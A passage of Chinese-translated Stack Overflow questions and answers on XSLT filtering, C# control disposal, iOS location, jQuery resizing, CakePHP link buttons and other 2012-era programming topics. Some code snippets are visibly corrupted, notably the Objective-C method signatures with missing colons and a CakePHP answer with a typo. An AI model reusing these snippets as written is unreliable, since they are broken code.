            </Segments>
        </Flight>
            <Flight>
            <Segments>
                <Segment>
                    <Id>5</Id>
                    <FlightNumber>2121</FlightNumber>
                </Segment>
                <Segment>
                    <Id>6</Id>
                    <FlightNumber>2584</FlightNumber>
                </Segment>
                <Segment>
                    <Id>7</Id>
                    <FlightNumber>2023</FlightNumber>
                </Segment>
            </Segments>
        </Flight>
    </Response>
</FilterResult> 
```

我想收到以下输出。

**预期输出：**

```
<FilterResult>
    <ResultCount>1</ResultCount>
    <Response>
        <Flight>
            <Segments>
                <Segment>
                    <Id>3</Id>
                    <FlightNumber>2121</FlightNumber>
                </Segment>
                <Segment>
                    <Id>4</Id>
                    <FlightNumber>2584</FlightNumber>
                </Segment>
            </Segments>
        </Flight>
    </Response>
</FilterResult> 
```

请帮我。我应该如何使用数组来过滤响应并获得预期的输出。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T12:52:26.373

**使用**：

```
/*/Result/*/Flight
            [count(*/*)=count(/*/Request/*/FlightId)
           and
             not(*/*/FlightNumber[not(. = /*/Request/*/FlightId)])
            ] 
```

**这是完整的转换：**

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/">
     <xsl:variable name="vHits" select=
     "/*/Result/*/Flight
                  [count(*/*)=count(/*/Request/*/FlightId)
                 and
                   not(*/*/FlightNumber[not(. = /*/Request/*/FlightId)])
                   ]"/>
    <FilterResult>
    <ResultCount><xsl:value-of select="count($vHits)"/></ResultCount>
    <Response>
     <xsl:copy-of select="$vHits"/>
    </Response>
  </FilterResult>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<Response>
    <Request>
        <RequestedFlights>
            <FlightId>2121</FlightId>
            <FlightId>2584</FlightId>
        </RequestedFlights>
    </Request>
    <Result>
        <Flights>
            <Flight>
                <Segments>
                    <Segment>
                        <Id>1</Id>
                        <FlightNumber>2121</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>2</Id>
                        <FlightNumber>1121</FlightNumber>
                    </Segment>
                </Segments>
            </Flight>
            <Flight>
                <Segments>
                    <Segment>
                        <Id>3</Id>
                        <FlightNumber>2121</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>4</Id>
                        <FlightNumber>2584</FlightNumber>
                    </Segment>
                </Segments>
            </Flight>
            <Flight>
                <Segments>
                    <Segment>
                        <Id>5</Id>
                        <FlightNumber>2121</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>6</Id>
                        <FlightNumber>2584</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>7</Id>
                        <FlightNumber>2023</FlightNumber>
                    </Segment>
                </Segments>
            </Flight>
        </Flights>
    </Result>
</Response> 
```

**产生了想要的正确结果：**

```
<FilterResult>
   <ResultCount>1</ResultCount>
   <Response>
      <Flight>
         <Segments>
            <Segment>
               <Id>3</Id>
               <FlightNumber>2121</FlightNumber>
            </Segment>
            <Segment>
               <Id>4</Id>
               <FlightNumber>2584</FlightNumber>
            </Segment>
         </Segments>
      </Flight>
   </Response>
</FilterResult> 
```

**说明**：

正确使用**[双重否定](http://en.wikipedia.org/wiki/Double_negation)**法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T13:01:28.887

```
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">
<xsl:output omit-xml-declaration="yes" indent="yes"/>
<xsl:strip-space elements="*" />  

<xsl:variable name="requested"
  select="/Response/Request/RequestedFlights/FlightId/text()" />

<xsl:template name="flights-as-string">
  <xsl:param name="Id" />
  <xsl:for-each select="$Id">
    <xsl:sort select="." />
    <xsl:value-of select="concat('[',.,']')" />
  </xsl:for-each>  
</xsl:template>

<xsl:variable name="requested-str-nodeset">
  <xsl:call-template name="flights-as-string">
    <xsl:with-param name="Id" select="$requested" />
  </xsl:call-template>
</xsl:variable>  
<xsl:variable name="requested-str" select="exsl:node-set($requested-str-nodeset)/text()" />

<xsl:template match="/*">
  <xsl:variable name="flight-output">
    <xsl:apply-templates select="Result/Flights/Flight" />
  </xsl:variable>
  <FilterResult>
    <ResultCount><xsl:value-of select="
      count( exsl:node-set($flight-output)/Flight)" /></ResultCount>
    <Response>
      <xsl:copy-of select="$flight-output" />
    </Response>
  </FilterResult>
</xsl:template>

<xsl:template match="Flight">
  <xsl:variable name="actual-str">
    <xsl:call-template name="flights-as-string">
      <xsl:with-param name="Id" select="Segments/Segment/FlightNumber/text()" />
    </xsl:call-template>
  </xsl:variable>  
  <xsl:if test="$requested-str = exsl:node-set($actual-str)/text()">
      <xsl:copy-of select="." />
  </xsl:if>
</xsl:template>

</xsl:stylesheet> 
```

# c# - 内存泄漏 - 返回而不处理“new CheckBox(...)”

> ID：13491409
> 
> 赞同：0
> 
> 时间：2012-11-21T10:38:22.163
> 
> 标签：c#, winforms, memory-leaks

```
protected override void SetValueFromControl()
{
CheckBox checkbox = new CheckBox();

if (this.comboBox_Meta.SelectedItem != null)
{
    if (this.comboBox_Meta.SelectedIndex != 1)
    {
        checkbox.Checked = true;
    }
    else
    {
       checkbox.Checked = false;
    }

    this.my_Helper.SetValueFromCheckBox("xxx", checkbox);
}
} 
```

我的 ANT Profiler 说有资源泄漏，如下错误

> 返回而不处理“new CheckBox(...)”。

在我的 SetValueFromCheckBox 方法中，我使用以下条件。

```
some value = _checkbox.Checked; 
```

注意：现在在社区提供有用的反馈后，我添加了“使用”并等待下一次构建以进行错误验证。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:41:30.183

No, the error means you should call `Dispose`.

or wrap it in a `using` block:

```
using (var chk = new CheckBox())
{
    // your code
} // at this line `Dispose` is called automatically, even in case of exception 
```

Every Windows Forms control creates a bunch of handles etc. that are not freed automatically. Most of them are only created when the control is displayed so you *might* be ok without the dispose call but since the profiler does not know that it will complain. And it is a best practice to always dispose objects that implement `IDisposable` - you never know if the implementation will change and the object will create handles by itself.

Documentation: [http://msdn.microsoft.com/en-us/library/system.idisposable.aspx](http://msdn.microsoft.com/en-us/library/system.idisposable.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:41:09.347

将事物设置为`null`实际处置它们是一种常见的误解。它不是。要处理`CheckBox`，请调用其`Dispose`方法。当您按照其他人的建议使用该`using`语句时，这会自动完成。

但是，当您实际将控件添加到控件树时，这不是必需的！在这种情况下，控件将在表单被处置时被处置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:41:18.427

It means you should call dispose on it or use the using statement.

```
using(CheckBox checkbox = new CheckBox())
{

    if (this.comboBox_Meta.SelectedItem != null)
    {
        if (this.comboBox_Meta.SelectedIndex != 1)
        {
            checkbox.Checked = true;
        }
        else
        {
           checkbox.Checked = false;

        }

        this.my_Helper.SetValueFromCheckBox("xxx", checkbox);
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:46:14.060

当您创建动态控件时，您最终应该将控件添加到控件树中。

如果你不这样做，那么创建这样的控制是没有意义的。

不将控件添加到树控件的直接副作用是您将错过控件树的开箱即用 Dispose。当一个控件被释放（顶层的窗体）时，它的子控件将被递归释放。

其他人建议添加一个`using`声明，但我认为这是错误的。它将删除警告，但实际问题是您没有正确使用控件树。

# iphone - iphone app - 如何只获取一次当前位置并将其存储以用于另一个功能？

> ID：13491411
> 
> 赞同：10
> 
> 时间：2012-11-21T10:38:24.177
> 
> 标签：iphone, objective-c, xcode, location

在过去的两周里，我一直在研究这个问题——我有一个应用程序，它在地图上显示了一条清晰的路线，从起点到终点。目的地是用户地址（由用户在我们设置的设置菜单中定义/输入），如果我硬编码起点，地图、路线和应用程序都可以正常工作。一旦我尝试实现任何涉及使用 cllocation 或 cllocationmanager 的东西，它就会崩溃并给我一个线程错误（有 3 个）。

这是当前视图控制器的头文件和实现文件：

```
#import <UIKit/UIKit.h>
#import <MapKit/MapKit.h>
#import "MapView.h"
#import "Place.h"
#import <CoreLocation/CoreLocation.h>

@interface HomeMapViewController : UIViewController <MKMapViewDelegate, CLLocationManagerDelegate>{

    IBOutlet UILabel *HomeAddressLabel;

}

@property (weak, nonatomic) IBOutlet MKMapView *MapView;
@property (strong, nonatomic) IBOutlet CLLocationManager *location;
@end 
```

实现文件：

```
#import "HomeMapViewController.h"

@interface HomeMapViewController ()

@end

@implementation HomeMapViewController
@synthesize MapView;
@synthesize location;
double lat = 37.331706;
double lon = -122.030598;
- (id)initWithNibNameNSString *)nibNameOrNil bundleNSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{
    //Retrieve saved address before view loads
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSString *HomeAddress = [defaults objectForKey:@"HomeAddress"];
    NSString *HomeCity = [defaults objectForKey:@"HomeCity"];
    NSString *HomeProvince = [defaults objectForKey:@"HomeProvince"];
    NSString *HomeZip = [defaults objectForKey:@"HomeZip"];
    NSString *HomeCountry = [defaults objectForKey:@"HomeCountry"];
    NSString *HomeAddressFull = [NSString stringWithFormat:@"%@, %@, %@, %@, %@", HomeAddress, HomeCity, HomeProvince, HomeZip, HomeCountry];

    //Set address label to saved address values
    HomeAddressLabel.text = HomeAddressFull;

    //Map Route Code

        MapView* mapView = [[MapView alloc] initWithFrame:
                        CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height)];
        //Shows user location

    [self.MapView setShowsUserLocation:YES];
    //set which mapview to show
        [self.MapView addSubview:mapView];

    self.location = [[CLLocationManager alloc]init];
    location.delegate = self;
    location.desiredAccuracy=kCLLocationAccuracyBest;
    location.distanceFilter = kCLLocationAccuracyBestForNavigation;//constant update of device location
    [location startUpdatingLocation];

    Place* start = [[Place alloc] init];
    start.name = @"Start Location";
    start.description = @"You started here.";
    //^should be changed to current location once that is implemented
    //start.latitude =    37.331706;
    //start.longitude = -122.030598;
    start.latitude = lat;
    start.longitude = lon;
    //start.latitude = location.location.coordinate.latitude;
    //start.longitude = location.location.coordinate.longitude;

    //Geocoder Code
    CLGeocoder *geocoder = [[CLGeocoder alloc] init];
    [geocoder geocodeAddressString:HomeAddressFull completionHandler:^(NSArray *placemarks, NSError *error) {
        if (error) {
            NSLog(@"Error: %@", [error localizedDescription]);
            return;
        }

        for (id object in placemarks) {
            CLPlacemark *placemark = object;

            Place* destination = [[Place alloc] init];
            destination.name = @"Destination";
            destination.description = [NSString stringWithFormat:@"%@, %@, %@", HomeAddress, HomeCity, HomeProvince];
            destination.latitude = placemark.location.coordinate.latitude;
            destination.longitude = placemark.location.coordinate.longitude;

            [mapView showRouteFrom:start toestination];
        }
    }];

    [super viewDidLoad];

}

- (void)locationManagerCLLocationManager *)manager didUpdateToLocationCLLocation *)newLocation fromLocationCLLocation *)oldLocation{
    [manager stopUpdatingLocation];

}

//************NEW METHOD
-(void)locationManagerCLLocationManager *)manager didFailWithErrorNSError *)error{
    NSString *msg = @"Error obtraining location:";
    UIAlertView *alert;
    alert = [[UIAlertView alloc]
             initWithTitle:@"Error"
             message:msg delegate:self
             cancelButtonTitle:@"OK"
             otherButtonTitles: nil];
    [alert show];

}

- (void)viewDidUnload
{
    [self setMapView:nil];
    HomeAddressLabel = nil;
    [super viewDidUnload];
    // Release any retained subviews of the main view.
}

- (BOOL)shouldAutorotateToInterfaceOrientationUIInterfaceOrientation)interfaceOrientation
{
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

@end 
```

我基本上想问是否有人可以帮助阐明我如何获取用户当前位置坐标并将它们存储为 start.latitude 和 start.longitude 值，以便路线显示来自用户当前位置的路径到他们的目的地。路线不应该在用户移动时自行更新，我只想在用户当前位置和目的地（正如我所做的那样）上有一个注释/地标，然后蓝点（又名用户）将能够看到自己沿着他们要走的路线前进。我已经尝试了这里的所有建议 - 有些根本没有工作，有些只工作一次，然后它再次失败（即使在重置模拟器内容之后！）。一些链接是相关的，但非常过时，所以那里的方法不起作用。

在这里，我认为获取用户当前位置坐标将是此功能的更简单任务！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-22T21:16:40.297

**.h 文件**

```
#import <CoreLocation/CoreLocation.h>

@property (nonatomic,retain) CLLocationManager *locationManager; 
```

**.m 文件**

```
- (NSString *)deviceLocation 
{
    NSString *theLocation = [NSString stringWithFormat:@"latitude: %f longitude: %f", self.locationManager.location.coordinate.latitude, self.locationManager.location.coordinate.longitude];
    return theLocation;
}

- (void)viewDidLoad
{
    self.locationManager = [[CLLocationManager alloc] init];
    self.locationManager.distanceFilter = kCLDistanceFilterNone; 
    self.locationManager.desiredAccuracy = kCLLocationAccuracyHundredMeters; // 100 m
    [self.locationManager startUpdatingLocation];
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-21T11:15:33.513

最简单的方法是将起始当前位置存储在 NSUserDefaults

```
 NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults setObject:latitude forKey:@"starLatitude"];
    [defaults setObject:longitude forKey:@"starLongitude"];
[defaults synchronize]; 
```

然后可以通过以下方式获取经纬度：

```
NSString *lati = [defaults objectForKey:@"starLatitude"]; 
```

# jquery - 使用 jQuery 拉伸图像以填充整个 div，在窗口调整大小时调整大小

> ID：13491412
> 
> 赞同：1
> 
> 时间：2012-11-21T10:38:30.440
> 
> 标签：jquery, css, image, resize, responsive-design

我知道以前有人问过这个问题，但是我能找到的解决方案都没有，而且我正在努力将它们混合在一起。

我有一个由一系列面板组成的网页，我正在使用 jQuery 调整每个面板的大小以填充文档窗口，如果调整窗口大小，则再次调整大小。

在某些面板中，我有图像，我希望图像填充整个 div，而不会倾斜，并在调整窗口大小时调整大小。

我已经设法让图像根据窗口的宽度调整大小，但是如果窗口变得太长，图像下方会有空白区域。

由于某些面板是使用 jQuery 循环插件的幻灯片，因此它可能会稍微复杂一些。

这是一些代码：

**HTML：**

```
<div id="panel-one" class="panel">

    <div class="cycle-slideshow" data-cycle-slides="> div">

        <div id="slide-one" class="slide">

            <a href="http://www.flickr.com/photos/blmiers2/6128832572/" title="Grizzly Bear - Animal - Wildlife - Alaska by blmiers2, on Flickr"><img src="http://farm7.staticflickr.com/6077/6128832572_c46d6ecace_b.jpg" width="1024" height="683" alt="Grizzly Bear - Animal - Wildlife - Alaska"></a>

        </div><!--#slide-one-->

    <div id="slide-two" class="slide">

            <a href="http://www.flickr.com/photos/peterlee79/5146115834/" title="Bear by Peter Lee(&amp;#51060;&amp;#50896;&amp;#55148;), on Flickr"><img src="http://farm2.staticflickr.com/1320/5146115834_9bb65ea57d_b.jpg" width="760" height="507" alt="Bear"></a>

        </div><!--#slide-two-->

        <div id="slide-three" class="slide">

           <a href="http://www.flickr.com/photos/upim/305578292/" title="bear by Timo Heuer, on Flickr"><img src="http://farm1.staticflickr.com/119/305578292_2f249d9de3_b.jpg" width="1024" height="768" alt="bear"></a>

        </div><!--#slide-three-->

    </div><!--.cycle-slideshow-->

</div><!--#panel-one-->

<div id="panel-two" class="panel">

    <div class="content">

    I'm panel two 

    </div><!--.content-->

</div><!--#panel-two-->

<div id="panel-three" class="panel">

    <a href="http://www.flickr.com/photos/lobstermassage/25347643/" title="Bear by CiroNT, on Flickr"><img src="http://farm1.staticflickr.com/23/25347643_cac744b73a_b.jpg" width="1024" height="680" alt="Bear"></a>

 </div><!--#panel-three--> 
```

​CSS **：**

```
.panel {
position: relative;
overflow: hidden;
width: 100%;
z-index: 1;
}

#panel-one {
background: #888;    
}

#panel-two {
background: #84c6d6;
}

#panel-three {
background: #444;
} 
```

**jQuery：**

```
$(function(){

    $('.panel, .cycle-slide, .slide').css({'height':($(window).height())+'px'});

    $(window).resize(function(){
    $('.panel, .cycle-slide, .slide').css({'height':($(window).height())+'px'});
    });

});

 div = $(".panel");
   imgsrc = div.find('img').attr('src');

   var img = new Image()
   img.onload = function(){
        imgw = img.width;
        imgh = img.height;

        resizeMyImg(imgw,imgh);
        div.find('img').show();

        $(window).resize(function(){ resizeMyImg(imgw,imgh) });

        }

   img.src = imgsrc

   function resizeMyImg(w,h){     
      //the width is larger
      if (w > h) {
        //resize the image to the div
        div.find('img').width(div.innerWidth() + 'px').height('auto');
      }        
      else {
        // the height is larger or the same
        //resize the image to the div
        div.find('img').height(div.innerHeight() + 'px').width('auto');
      }

     } 
```

​这是我要做的事情：http: [//jsfiddle.net/pwQdV/](http://jsfiddle.net/pwQdV/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:58:18.927

我认为您可以使用该周期的第 2 版。

[http://jquery.malsup.com/cycle2/](http://jquery.malsup.com/cycle2/)

```
.cycle-slideshow img {
    display : block;
    width : 100%;
} 
```

示例：http: [//jsfiddle.net/mBDyH/](http://jsfiddle.net/mBDyH/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T22:05:42.077

如果您不想要空白空间，那么您必须根据图像的*最小*尺寸而不是最大尺寸调整大小。这意味着，在大多数情况下，您的图像将被调整大小，以便它在一个维度上溢出您的 div，并与您在另一维度上的 div 完全匹配。如果您`overflow: hidden`在 div 上进行设置，它将有效地裁剪图像的溢出部分。

[http://jsfiddle.net/pwQdV/9/](http://jsfiddle.net/pwQdV/9/)

```
// notice: `h` and `w` are swapped here...
if (h > w) {
    //resize the image to the div
    div.find('img').width(div.innerWidth() + 'px').height('auto');
} else {
    // the height is larger or the same
    //resize the image to the div
    div.find('img').height(div.innerHeight() + 'px').width('auto');
} 
```

# jmeter - 我无法在 jmeter 中记录登录页面事件

> ID：13491414
> 
> 赞同：-4
> 
> 时间：2012-11-21T10:38:51.487
> 
> 标签：jmeter

当我启动代理服务器时，将我的浏览器设置设置为具有指定端口的本地主机，然后输入 URL，第一个事件被记录下来。
然后我去获取登录凭据，这不是记录器。
有人可以为我提供一些详细的帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:36:15.913

启动代理服务器后，您可以尝试使用其他浏览器记录登录。如果这不起作用，则使用 jmeter 中的选项来记录页面中的所有嵌入对象，以及使用事务分组选项。祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:58:05.697

我不是 jmeter 用户，所以这在技术上是基于我的 Selenium 经验的猜测：

虽然 Selenium 在 HTTP 基本身份验证方面存在问题，但我的猜测是，Jmeter 也会有问题，我猜你尝试访问的页面是受 HTTP 基本身份验证保护的站点。

（猜测太多，我知道）

所以，我的建议是尝试像这样在 URL 请求中传递用户名和密码

```
http://username:password@example.com 
```

但这仅适用于我的猜测是正确的...

# php - cakephp 创建重定向到视图的简单按钮

> ID：13491421
> 
> 赞同：2
> 
> 时间：2012-11-21T10:39:08.147
> 
> 标签：php, forms, cakephp

我开始使用 cakephp 并且在构建以下内容时遇到了一些问题：我希望我的应用程序的主页有 4 个简单的按钮，可以重定向到不同的创建视图。我怎样才能做到这一点？

我试过这个：

```
 <?php
echo $this->Form->create('Post');
echo $this->Form->button('Redirect1', array('type'=>'button'));
echo $this->Form->button('Redirect1', array('type'=>'button'));
echo $this->Form->button('Redirect1', array('type'=>'button'));
echo $this->Form->end();
?> 
```

但我想不需要提交表格吧？但是我在搜索中没有找到其他方式。不能只在按钮单击时更改页面吗？

谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-21T11:22:49.197

表单按钮不应该用作简单的链接，无论如何，您创建按钮，然后添加一些 javascript 或 jQuery 以使其按贾斯汀所说的那样工作。（虽然我通常更喜欢在代码中使用外部 .js 文件）

另一种选择是为链接添加一种样式，使其看起来像一个按钮，例如：

```
echo $this->Html->link("Demo", array('controller' => 'yourcontroller','action'=> 'youraction', $possibleParameter), array( 'class' => 'button')) 
```

其中按钮可以定义为：

```
a.button {
    color: #6e6e6e;
    font: bold 12px Helvetica, Arial, sans-serif;
    text-decoration: none;
    padding: 7px 12px;
    position: relative;
    display: inline-block;
    text-shadow: 0 1px 0 #fff;
    -webkit-transition: border-color .218s;
    -moz-transition: border .218s;
    -o-transition: border-color .218s;
    transition: border-color .218s;
    background: #f3f3f3;
    background: -webkit-gradient(linear,0% 40%,0% 70%,from(#F5F5F5),to(#F1F1F1));
    background: -moz-linear-gradient(linear,0% 40%,0% 70%,from(#F5F5F5),to(#F1F1F1));
    border: solid 1px #dcdcdc;
    border-radius: 2px;
    -webkit-border-radius: 2px;
    -moz-border-radius: 2px;
    margin-right: 20px;
    cursor:pointer;
}
a.button:hover{
    color: #333;
    border-color: #999;
    -moz-box-shadow: 0 2px 0 rgba(0, 0, 0, 0.2); 
-webkit-box-shadow:0 2px 5px rgba(0, 0, 0, 0.2);
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.15);
}
a.button:active {
    color: #000;
    border-color: #444;
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-12-06T10:32:10.383

我在搜索类似问题时发现了这个问题。在我看来，最简单的方法是：

```
$this->Html->link($this->Form->button('Button'), array('action' => 'viewSomethin',$id), array('escape'=>false,'title' => "Click to view somethin")); 
```

也许这对某人有用。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-21T10:46:37.430

我认为您只需要稍后使用 css 设置样式的链接（假设您使用的是 Html 助手）：

```
<?php 
echo $this->Html->link('Click Here', '/redirect/url', array('class' => 'button')); 
?> 
```

在这里阅读更多：http: [//book.cakephp.org/1.3/en/view/1442/link](http://book.cakephp.org/1.3/en/view/1442/link)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-07-24T08:38:46.460

您可以将 Html 规则属性添加到您的链接。此规则会将链接设置为按钮。

```
echo $this->Html->link('Blogs', 
    array('action' => 'add'), 
    array(
        'bootstrap-type' => 'primary',
        'class' => 'btn btn-lg btn-primary btn-block',
        // transform link to a button
        'rule' => 'button'
    )
); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-21T10:50:04.107

您可以使用

```
<?php echo $this->Html->link('ADD New One', '/controllername/functionname')?> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-04-30T11:52:43.617

我也只是在寻找这个“问题”。但我对表单的按钮不满意，我只想在操作类中获得按钮：![在此处输入图像描述](../Images/19328be10ca734b4754c74c44207ed11.png)

所以我为我找到了 2 个解决方案：

**解决方案 1：使用 css 类“action”将按钮包装在 span 中**

```
<span class="action">
    <?php
    echo $this->Html->link("Send Again", "url");
    ?>
</span> 
```

css 类`action`已经在 cake.generic 样式表中表示。所以它将直接是一个不错的按钮。

**解决方案 2：复制 css 样式`.actions a`**

这个解决方案更像是对[Alvaro](https://stackoverflow.com/a/13492220/2625488)解决方案的补充。我还不能发表评论，所以我必须为此做一个额外的回答。

所以，我没有使用 Alvaro 的 css，因为它们用于表单按钮，并且与原始按钮略有不同。`.action a`所以我只是在原始文件中搜索样式`cake.generic.css`并将它们复制到我自己的 css 文件中并将选择器更改为`a.button`.

然后现在您可以使用它来生成没有任何包装器的按钮：

```
<?php echo $this->Html->link("Send Again, "url", ["class" => "button"]) ?> 
```

**CakePHP** **2.6.2**版的 css ：

```
a.button {
  font-weight: normal;
  padding: 4px 8px;
  background: #dcdcdc;
  background-image: -webkit-gradient(linear, left top, left bottom, from(#fefefe), to(#dcdcdc));
  background-image: -webkit-linear-gradient(top, #fefefe, #dcdcdc);
  background-image: -moz-linear-gradient(top, #fefefe, #dcdcdc);
  background-image: -ms-linear-gradient(top, #fefefe, #dcdcdc);
  background-image: -o-linear-gradient(top, #fefefe, #dcdcdc);
  background-image: linear-gradient(top, #fefefe, #dcdcdc);
  color: #333;
  border: 1px solid #bbb;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  border-radius: 4px;
  text-decoration: none;
  text-shadow: #fff 0px 1px 0px;
  min-width: 0;
  -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3), 0px 1px 1px rgba(0, 0, 0, 0.2);
  -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3), 0px 1px 1px rgba(0, 0, 0, 0.2);
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3), 0px 1px 1px rgba(0, 0, 0, 0.2);
  -webkit-user-select: none;
  user-select: none;
}

a.button:hover {
  background: #ededed;
  border-color: #acacac;
  text-decoration: none;
}

a.button:active {
  background: #eee;
  background-image: -webkit-gradient(linear, left top, left bottom, from(#dfdfdf), to(#eee));
  background-image: -webkit-linear-gradient(top, #dfdfdf, #eee);
  background-image: -moz-linear-gradient(top, #dfdfdf, #eee);
  background-image: -ms-linear-gradient(top, #dfdfdf, #eee);
  background-image: -o-linear-gradient(top, #dfdfdf, #eee);
  background-image: linear-gradient(top, #dfdfdf, #eee);
  text-shadow: #eee 0px 1px 0px;
  -moz-box-shadow: inset 0 1px 4px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: inset 0 1px 4px rgba(0, 0, 0, 0.3);
  box-shadow: inset 0 1px 4px rgba(0, 0, 0, 0.3);
  border-color: #aaa;
  text-decoration: none;
} 
```

希望在提出问题三年后对大家有所帮助。:D

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-21T11:05:03.077

像下面这样的东西会为你工作

```
$this->Form->button('Home', 
      array('onclick' => "location.href='".$this->Html->url($url)."'")); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-10-08T23:49:21.817

我认为最好的解决方案是使用 postButton，例如：

```
echo $this->Form->postButton('Text Button', array('controller'=>'controllername','action'=>'action_to_do')); 
```

您必须根据需要更改 'controllername' 和 'action_to_do'

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-05-17T20:20:58.310

对于 CakePHP 2.X

```
 <button id="create_task_groups" onclick="window.location.href='<?php echo $this->Html>url(array('plugin'=>'task_calendar', 'controller'=>'task_groups', 'action'=>'add'))?>'"> Create Task Group</button> 
```

# emacs - CEDET 缓存错误

> ID：13491422
> 
> 赞同：1
> 
> 时间：2012-11-21T10:39:08.510
> 
> 标签：emacs, cedet

当 emacs 启动时，CEDET 抱怨一系列缓存文件被写保护：

> 缓存错误：[~/.semanticdb/!usr!include!i386-linux-gnu!sys!semantic.cache]（错误在保存文件中，找到对象构造函数列表，但没有为插槽：表指定类型），重新启动注意：文件被写保护[2次]

当我`semantic-ia-complete-symbol-menu`第一次调用时，会抛出大量缓存错误，并且 minibuffer 会因错误消息而疯狂几秒钟。

> 缓存错误：[~/.semanticdb/!usr!include!i386-linux-gnu!gnu!semantic.cache]（错误在保存文件中，找到对象构造函数列表，但没有为插槽：表指定：类型），重新启动[8次]

初次通话后，问题就消失了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T13:06:20.933

退出 emacs，删除`~/.semanticdb`并重新开始 - 将重新创建目录并重新解析文件。看起来，您以 root 身份运行 emacs。

`chown -R <your id> ~/.semanticdb`或者您可以简单地使用和更改权限`chmod -R a-w,u+wr ~/.semanticdb`

# javascript - 在 Blogger 中调整 iframe 高度

> ID：13491428
> 
> 赞同：0
> 
> 时间：2012-11-21T10:39:28.423
> 
> 标签：javascript, security, iframe, blogger, blogspot

我在 Blogger 中插入以下 iframe：

```
<iframe id="myId" src="http:www.example.com" width="100%" onload="var iframe = document.getElementById('myId');iframe.style.height = iframe.scrollHeight.toString() + 'px';"></iframe> 
```

它应该根据其内容自动调整其高度。

我已经在我创建的 HTML 页面中对其进行了测试，并且它在那里工作。

但在 Blogger 中它不起作用。它插入 iframe，但其高度未根据其内容进行调整。

为什么这不起作用？是 Blogger 政策还是类似的政策？

是否有另一种方法可以以编程方式自动调整我的 iframe 高度？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T14:27:53.027

由于同源策略，这是不可能的。

能够测量来自不同站点的页面高度实际上是从该站点泄漏信息。例如，设想构建一个网上银行交易列表页面；通过读取它的高度，您可以确定用户当前是否登录了他们的网上银行，如果是，则可能是最近进行了多少交易。

有[一项提议](http://wiki.whatwg.org/wiki/AllowSeamless)允许框架网站选择加入使用 HTML5 无缝 iframe 以高度敏感的方式包含在文档中。但是，我们目前距离您可以在浏览器中依赖的东西还有很长的路要走。

# drupal - Drupal 7：视图创建的页面中的内容“交错”

> ID：13491433
> 
> 赞同：0
> 
> 时间：2012-11-21T10:39:49.680
> 
> 标签：drupal, views

我创建了一个内容类型，其中包含以下字段：

*   图片
*   标题
*   身体

正文字段包含指向我网站上页面的链接列表

然后，我创建了一个视图以在页面上垂直列出内容。

可以在此处找到内容示例：

[http://www.faithmov.com/drupal/content/development-doctrine#overlay-context=frontpage-articles](http://www.faithmov.com/drupal/content/development-doctrine#overlay-context=frontpage-articles)

当页面打开时，页面上的记录是“交错的”，如您在此处看到的：

[http://www.faithmov.com/drupal/frontpage-articles#overlay-context=content/development-doctrine](http://www.faithmov.com/drupal/frontpage-articles#overlay-context=content/development-doctrine)

我怎样才能治愈这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T12:32:48.853

我想您使用视图来显示节点？

如果是这种情况，使用可以将以下行类添加`clearfix`到格式 > 设置。那应该解决它。

**说明：** 浮动图片不计入 div 高度，因此下一个 div 开始于 div 之下，但不在图片之下。clearfix 是一个 Drupal 类，它插入`clear: both`到它所应用的所有对象（在本例中为所有视图行）。

当你清除一个 div 时，它会包裹在最大的浮动对象下。

# android - 为什么我的 AlertDialog 不起作用？

> ID：13491435
> 
> 赞同：-3
> 
> 时间：2012-11-21T10:39:52.020
> 
> 标签：android, android-emulator

```
public void showAlertDialog(Context context, String title, String message, Boolean status) {

